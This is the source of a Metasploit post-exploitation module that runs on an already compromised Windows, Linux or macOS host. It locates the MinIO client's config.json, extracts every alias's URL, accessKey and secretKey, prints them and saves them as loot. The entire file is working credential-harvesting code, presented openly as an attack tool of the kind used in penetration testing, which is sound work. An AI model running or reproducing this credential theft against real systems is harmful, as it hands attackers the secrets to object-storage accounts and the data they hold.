##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather MinIO Client Key',
        'Description' => %q{
          This is a module that searches for MinIO Client credentials on a windows remote host.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MinIO-Client-7d940c60ae8545aeaa29c96536dda855' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win', 'linux', 'osx', 'unix' ],
        'SessionTypes' => %w[meterpreter powershell shell],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MinIO Client']),
      ]
    )
  end

  def parser_minio(config_path)
    print_status("Parsing file #{config_path}")
    some_result = Hash.new
    if file?(config_path)
      file_contents = read_file(config_path)
      if file_contents.blank?
        print_warning('Configuration file content is empty')
        return some_result
      end
      begin
        configuration = JSON.parse(file_contents)
        if !configuration['aliases'].nil?
          some_result = configuration['aliases']
        end
      rescue JSON::ParserError => e
        print_error("Unable to parse configuration:#{e}")
      end
    else
      print_error("Configuration file not found:#{config_path}")
    end
    return some_result
  end

  def print_and_save(all_result)
    columns = [
      'name',
      'url',
      'accessKey',
      'secretKey',
      'api',
      'path',
    ]
    tbl = Rex::Text::Table.new(
      'Header' => 'MinIO Client Key',
      'Columns' => columns
    )

    all_result.each do |name, item|
      row = [name, item['url'], item['accessKey'], item['secretKey'], item['api'], item['path']]
      tbl << row
    end

    print_line(tbl.to_s)
    if tbl.rows.count > 0
      path = store_loot('host.minio', 'text/plain', session, tbl, 'minio_client.txt', 'MinIO Client Key')
      print_good("Session info stored in: #{path}")
    end
  end

  def get_config_file_path
    case session.platform
    when 'windows'
      home = get_env('USERPROFILE')
      return if home.nil?

      config_path = home + '\\mc\\config.json'
      return config_path
    when 'linux', 'osx', 'unix'
      home = get_env('HOME')
      return if home.nil?

      config_path = home + '/.mc/config.json'
      return config_path
    end
  end

  def run
    # used to grab files for each user on the remote host
    config_path = datastore['CONFIG_PATH'] || ''
    result = Hash.new
    if config_path.empty?
      result = parser_minio(get_config_file_path)
    else
      result = parser_minio(config_path)
    end
    return if result.empty?

    print_and_save(result)
  end
end
